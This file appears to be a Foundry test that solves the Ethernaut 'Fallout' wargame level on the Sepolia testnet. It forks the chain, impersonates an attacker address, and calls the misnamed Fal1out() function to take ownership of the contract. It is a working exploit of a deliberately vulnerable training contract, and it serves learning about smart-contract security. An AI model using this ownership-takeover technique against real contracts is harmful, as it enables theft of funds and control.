// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Fallout.sol";

contract Level2 is Test {
    Fallout fallout = Fallout(payable(0x3BcFDA695f300c0F6933fce850eD492e626147df));
    address attacker = 0x8c9D2Ed582846497b454cAFA67160F679AF90A2f;

    function setUp() public {
        vm.createSelectFork(vm.rpcUrl("sepolia"), 4545552);
        vm.startPrank(attacker);
    }

    function testLevel2() public {
        fallout.Fal1out();
        assertEq(attacker, address(fallout.owner()));
    }

    receive() external payable {}
}
